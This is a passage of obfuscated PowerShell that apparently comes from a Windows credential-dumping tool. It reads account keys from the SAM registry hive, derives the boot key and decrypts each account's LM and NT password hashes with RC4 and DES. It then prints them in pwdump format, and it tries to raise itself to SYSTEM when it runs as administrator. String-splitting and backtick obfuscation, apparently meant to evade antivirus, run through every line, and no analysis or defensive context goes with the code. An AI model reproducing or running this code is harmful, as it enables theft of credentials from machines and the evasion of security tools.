            return ,(&("{3}{1}{2}{0}"-f 'ptHashes','c','ry','De') ${u}."R`ID" ${e`Nc`_lm_h`AsH} ${e`N`C_NT_H`Ash} ${Hb`oO`TKeY});
        }
        function DEC`RYpTha`S`HES(${R`ID}, [byte[]]${e`N`c_lM_HaSH}, [byte[]]${enC_Nt`_H`A`Sh}, [byte[]]${H`BO`OtK`eY})
        {
            [byte[]]${l`mhASH} = ${Em`pTY_`LM}; [byte[]]${nThA`SH}=${EMPtY`_nT};
            
            if (${en`C_L`M_hA`sH})
            {    
                ${LmHa`sh} = &("{1}{2}{3}{0}" -f 'sh','Decr','yptS','ingleHa') ${R`id} ${H`B`ootkey} ${eNc`_`lm_haSh} ${al`Mpassw`orD};
            }
    
            
            if (${eNC_`Nt_h`A`sH})
            {
                ${nThA`Sh} = &("{2}{1}{0}{3}{4}"-f 'in','yptS','Decr','gl','eHash') ${r`iD} ${H`BO`otK`EY} ${Enc_nT`_`HASH} ${Antp`Ass`W`ORd};
            }
            return ,(${LmhA`sh},${NTh`A`sH})
        }
        function De`cry`Pt`sIn`gLeHash(${r`iD},[byte[]]${hBoo`T`k`ey},[byte[]]${EN`c_Ha`sH},[byte[]]${lm`NTstr})
        {
            ${DEskE`Ys} = &("{2}{1}{0}" -f 'y','_to_ke','sid') ${r`Id};
            ${M`d5} =   (  VariaBle  fjg  -VA )::("{0}{1}"-f'C','reate').Invoke();
            ${rC4_`K`ey} = ${M`D5}."c`OMput`EhA`SH"(${h`BOotkeY}[0..0x0f] +   (GEt-vARiabLE  ("v21"+"HF") ).value::("{2}{0}{1}" -f 'etByt','es','G').Invoke(${r`Id}) + ${Lmnts`Tr});
            ${R`c4} = &("{1}{2}{0}"-f '4','NewR','C') ${RC`4`_keY};
            ${oBF`k`EY} = ${R`C4}.("{2}{1}{0}"-f 'pt','ry','enc').Invoke(${E`Nc_ha`sh});
            ${ha`Sh} = (&("{2}{1}{0}"-f 'crypt','e','des_d')  ${o`BfkEy}[0..7] ${dESk`eYS}[0]) + 
                (&("{0}{2}{1}" -f'des','decrypt','_') ${Ob`FK`ey}[8..$(${oBf`K`EY}."L`eng`Th" - 1)] ${des`ke`ys}[1]);
            return ,${h`ASh};
        }
        function GET`-UseRKe`YS
        {
            &('ls') ((("{3}{9}{2}{10}{5}{0}{1}{7}{8}{6}{4}" -f'se','CxAcco','xSAMeC','H','xUsers','eCxDomain','C','un','te','KLM:eC','xSAM'))-ReplAcE 'eCx',[ChaR]92) | 
                &("{1}{0}"-f're','whe') {${_}."P`sCHilDNA`me" -match "^[0-9A-Fa-f]{8}$"} | 
                    &("{0}{2}{1}" -f'Add','Member','-') ("{1}{0}{3}{2}" -f 'asPro','Ali','erty','p') ("{2}{1}{0}" -f 'e','m','KeyNa') ("{0}{2}{1}" -f'PSChi','me','ldNa') -PassThru |
                    &("{2}{0}{1}"-f'-Memb','er','Add') ("{2}{1}{0}" -f'rty','ope','ScriptPr') ("{1}{0}" -f 'id','R') {  $4atV::("{1}{0}" -f 'nt32','ToI').Invoke(${t`HIS}."ps`chi`Ld`NamE", 16)} -PassThru |
                    &("{0}{1}{2}{3}" -f 'Add','-M','em','ber') ("{0}{3}{2}{1}" -f 'Sc','tProperty','ip','r') ('V') {[byte[]](${TH`is}.("{2}{1}{0}" -f 'ue','l','GetVa').Invoke("V"))} -PassThru |
                    &("{0}{2}{1}"-f'Add-M','er','emb') ("{1}{2}{0}"-f 'y','ScriptProp','ert') ("{0}{1}"-f'Us','erName') {&("{0}{2}{3}{1}" -f 'G','UserName','e','t-')(${T`His}.("{2}{0}{1}"-f 'V','alue','Get').Invoke("V"))} -PassThru |
                    &("{1}{2}{0}" -f'-Member','A','dd') ("{1}{0}{3}{2}"-f 'Prop','Script','y','ert') ("{2}{0}{1}" -f 'hOffs','et','Has') { ( GET-ItEM VArIAbLe:v21HF).vAlUE::("{0}{1}"-f'T','oUInt32').Invoke(${tH`is}.("{1}{0}" -f 'tValue','Ge').Invoke("V")[0x9c..0x9f],0) + 0xCC} -PassThru
        }
        function Du`m`P`HaSheS
        {
            &("{2}{0}{1}"-f 'dA','pi','Loa')
            ${b`OO`TKEY} = &("{2}{1}{0}"-f'tKey','oo','Get-B');
            ${HB`O`oTkEy} = &("{1}{2}{0}{3}"-f 'e','Get-HBoo','tK','y') ${boO`Tk`Ey};
            &("{3}{0}{2}{1}" -f't-User','eys','K','Ge') | &('%'){
                ${h`A`SHEs} = &("{3}{0}{2}{1}"-f'se','shes','rHa','Get-U') ${_} ${HbOo`T`kEY};
                "{0}:{1}:{2}:{3}:::" -f (${_}."U`sErnA`ME",${_}."R`id", 
                      ( geT-varIABLe ('v2'+'1hF')  ).VALue::"toStR`i`Ng"(${H`A`sHEs}[0]).("{2}{0}{1}"-f 'lac','e','Rep').Invoke("-","").("{1}{0}{2}"-f 'L','To','ower').Invoke(), 
                      (VaRiABLe  V21HF  -valUEoNLY )::"Tos`TrING"(${h`AsH`eS}[1]).("{0}{1}"-f 'Rep','lace').Invoke("-","").("{1}{0}{2}"-f'e','ToLow','r').Invoke());
                "`n"
            }
        }
        if ( ( gET-vArIabLE ('fKR'+'c')  ).vALUE::("{2}{4}{3}{0}{1}"-f 'A','dmin','IsUs','rAn','e').Invoke())
        {
            if (  (GEt-vaRiabLe  qkY  -VAL)::("{2}{0}{1}"-f'n','t','GetCurre').Invoke()."iSsys`T`em")
            {
                &("{0}{1}{2}" -f 'Du','mpHa','shes')
            }
            else
            {
                &("{0}{1}{2}" -f'Eleva','te','Privs')
                if (  (Get-CHIldItEM  vARiabLE:QkY  ).VaLUE::("{0}{2}{3}{1}" -f'Get','ent','C','urr').Invoke()."i`SsYS`TEM")
                {
                    &("{0}{1}{2}" -f'Dum','pHash','es')
                }
            }
        }
        else
        {
            &("{0}{3}{2}{1}" -f 'Wr','or','e-Err','it') ("{7}{4}{2}{8}{6}{5}{3}{1}{0}" -f'.','rivileges necessary','rato','p','ist','System ',' or ','Admin','r')
        }
}